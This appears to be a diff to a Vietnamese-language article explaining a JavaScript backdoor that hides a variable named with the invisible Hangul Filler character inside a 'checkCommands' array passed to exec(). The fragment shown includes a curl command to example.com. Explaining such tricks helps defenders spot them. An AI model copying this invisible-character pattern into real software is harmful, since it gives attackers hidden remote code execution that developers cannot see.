@@ -38,7 +38,7 @@ const checkCommands = [
         'curl -s http://example.com/',\u3164
     ];
 ```
-Ở đây hacker dùng "HANGUL FILLER" để dấu backdoor, sau đó mỗi lần muốn RCE chỉ cần nạp command vào tham số kí tự này là tham số, tham số này sẽ nằm ẩn trong hàm checkCommands mà dev không thể thấy
+Ở đây hacker dùng "HANGUL FILLER" để dấu backdoor, sau đó mỗi lần muốn RCE chỉ cần nạp command vào kí tự này hay tham số này, tham số này sẽ nằm ẩn trong mảng checkCommands mà dev không thể thấy đợi được nạp vào `exec()`
 
 
 ```python
